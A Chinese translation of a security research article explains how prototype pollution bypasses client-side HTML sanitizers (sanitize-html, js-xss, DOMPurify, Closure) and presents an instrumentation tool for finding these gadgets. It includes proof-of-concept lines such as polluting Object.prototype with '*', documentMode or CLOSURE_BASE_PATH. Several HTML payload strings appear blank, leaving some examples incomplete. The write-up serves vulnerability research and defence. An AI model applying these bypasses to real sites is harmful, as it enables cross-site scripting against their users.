我们将重点检查`allowedAttributesMap`。简而言之，检查当前标记或所有标记是否允许该属性(通配符`'*'`)。其中相当有趣的是，`sanitize-html`对于原型污染有一定的保护措施：
    // Avoid false positives with .__proto__, .hasOwnProperty, etc.
    function has(obj, key) {
      return ({}).hasOwnProperty.call(obj, key);
    }
`hasOwnProperty`检查对象是否有属性，但它不遍历原型链。这意味着对has函数的所有调用都不容易受到原型污染的影响。但是，has不适用于通配符！
    (allowedAttributesMap['*'] && allowedAttributesMap['*'].indexOf(a) !== -1)
我们可以进行原型污染
    Object.prototype['*'] = ['onload']
onLoad是任何标记的有效属性：  
# XSS
它还可以有选择地接受第二个参数，称为options。对于XSS的原型污染是非常简单的：
    options.whiteList = options.whiteList || DEFAULT.whiteList;
      options.onTag = options.onTag || DEFAULT.onTag;
      options.onTagAttr = options.onTagAttr || DEFAULT.onTagAttr;
      options.onIgnoreTag = options.onIgnoreTag || DEFAULT.onIgnoreTag;
      options.onIgnoreTagAttr = options.onIgnoreTagAttr || DEFAULT.onIgnoreTagAttr;
      options.safeAttrValue = options.safeAttrValue || DEFAULT.safeAttrValue;
      options.escapeHtml = options.escapeHtml || DEFAULT.escapeHtml;
`options.propertyName`名称表单中的所有这些属性都可能被污染。对于`whiteList`，它遵循以下格式：
    a: ["target", "href", "title"],
        abbr: ["title"],
        address: [],
        area: ["shape", "coords", "href", "alt"],
        article: [],
所以我们的想法是定义自己的白名单，接受带有`onerror`和`src`属性的`img`标记：  
# dompurify
DOMPurify还接受带有配置的第二个参数。这里还出现了一种模式，使其容易受到原型污染的影响：
    /* Set configuration parameters */
          ALLOWED_TAGS = 'ALLOWED_TAGS' in cfg ? addToSet({}, cfg.ALLOWED_TAGS) : DEFAULT_ALLOWED_TAGS;
          ALLOWED_ATTR = 'ALLOWED_ATTR' in cfg ? addToSet({}, cfg.ALLOWED_ATTR) : DEFAULT_ALLOWED_ATTR;
在JavaScript中，`in`操作符遍历原型链。因此，如果Object.prototype中存在此属性，则`'ALLOWED_ATTR' in
cfg`返回true。  
默认情况下，`DOMPurify`允许``标记，因此只需要使用`onerror`和`src`污染`ALLOWED_ATTR`。
有趣的是，Cure53发布了一个新版本的[DOMPurify](https://github.com/cure53/DOMPurify/commit/082b2044f553d3ac4ab9414c97eddc2259bf922f
"DOMPurify")，试图规避这种攻击。
# Closure
Closure Saniizer有一个名为 `attributewhitelist.js`的文件，该文件的格式如下：
    goog.html.sanitizer.AttributeWhitelist = {
      '* ARIA-CHECKED': true,
      '* ARIA-COLCOUNT': true,
      '* ARIA-COLINDEX': true,
      '* ARIA-CONTROLS': true,
      '* ARIA-DESCRIBEDBY': tru
    ...
    }
在此文件中，定义了允许的属性列表。它遵循`"TAG_NAME
ATTRIBUTE_NAME"`的格式，其中`TAG_NAME`也可以是通配符`(“*”)`。因此绕过也非常简单，
      const html = '';
      const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
      const sanitized = sanitizer.sanitize(html);
      const node = goog.dom.safeHtmlToNode(sanitized);
      document.body.append(node);
# 识别原型污染的工具
上面已经表明，原型污染可以绕过所有常用的JS过滤器。如何检测原型污染  
我的第一个想法是使用正则表达式扫描库源代码中所有可能的标识符，然后将此属性添加到`Object.prototype`。如果属性可以被访问，此处便有遭受原型污染攻击的风险。  
以下是摘自DOMPurify的代码片段：
    if (cfg.ADD_ATTR) {
            if (ALLOWED_ATTR === DEFAULT_ALLOWED_ATTR) {
              ALLOWED_ATTR = clone(ALLOWED_ATTR);
            }
我们可以从代码片段中提取以下可能的标识符
    ["if", "cfg", "ADD_ATTR", "ALLOWED_ATTR", "DEFAULT_ALLOWED_ATTR", "clone"]
现在，我在Object.prototype中定义所有这些属性：
    Object.defineProperty(Object.prototype, 'ALLOWED_ATTR', {
      get() {
        console.log('Possible prototype pollution for ALLOWED_ATTR');
        console.trace();
        return this['$__ALLOWED_ATTR'];
      },
      set(val) {
        this['$_ALLOWED_ATTR'] = val;
      }
    });
此方法虽然有效，但有一些缺点：  
1.不适用于计算属性名称  
2.检查属性是否存在有时候会出现逻辑错误：例如，`obj`中的`ALLOWED_ATTR`将返回true  
所以我想出了第二种方法；根据定义，我可以访问原型污染攻击的库的源代码。  
因此，我可以使用代码插桩（code instrumentation）来更改对函数的所有属性访问，从而检查属性是否会到达原型。
    if (cfg.ADD_ATTR)
它将被转化为：
    if ($_GET_PROP(cfg, 'ADD_ATTR))
其中，`$_GET_PROP`定义为：
    window.$_SHOULD_LOG = true;
      window.$_IGNORED_PROPS = new Set([]);
      function $_GET_PROP(obj, prop) {
          if (window.$_SHOULD_LOG && !window.$_IGNORED_PROPS.has(prop) && obj instanceof Object && typeof obj === 'object' && !(prop in obj)) {
              console.group(`obj[${JSON.stringify(prop)}]`);
              console.trace();
              console.groupEnd();
          }
          return obj[prop];
      }
基本上，所有属性访问都转换为对`$_GET_PROP`的调用，当从`Object.prototype`读取属性时，该调用会在控制台中打印信息。  
对此，我编写了一个工具放在了[github](https://github.com/securitum/research/tree/master/r2020_prototype-pollution "github")上  
多亏了这个方法，我又发现另外两个滥用原型污染绕过过滤器的例子。下面是我关于运行DOMPurify的记录  
让我们看一下正在访问 documentMode的行：
    DOMPurify.isSupported = implementation && typeof implementation.createHTMLDocument !== 'undefined' && document.documentMode !== 9;
因此，DOMPurify会检查当前浏览器是否支持DOMPurify.如果isSupported为false，则DOMPurify不执行任何过滤操作。  
这意味着我们可以污染原型并设置`Object.prototype.documentMode = 9`来绕过过滤器。
    const DOMPURIFY_URL = 'https://raw.githubusercontent.com/cure53/DOMPurify/2.0.12/dist/purify.js';
      (async () => {
        Object.prototype.documentMode = 9;
        const js = await (await fetch(DOMPURIFY_URL)).text();
        eval(js);
        console.log(DOMPurify.sanitize(''));
        // Logs: "", i.e. unsanitized HTML
      })();
此方法的唯一缺点是原型需要在加载DOMPurify之前受到污染。  
现在让我们来看一下Closure。首先，现在很容易看到Closure检查属性是否在允许列表中：
第二：
Closure加载大量具有依赖关系的JS文件。`CLOSURE_BASE_PATH`定义路径。所以我们可以污染属性，从任何路径加载我们自己的JS。  
proof
因为[pollute.js](https://github.com/securitum/research/tree/master/r2020_prototype-pollution "pollute.js")，我们才有了更多的利用场景。
# 总结
原型污染会绕过所有常用的HTML过滤器。这通常通过影响元素或属性的白名单列表来实现。  
最后要注意的是，如果您在Google搜索栏中发现了原型污染，那么就可以触发XSS。  
[原文链接](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ "原文链接")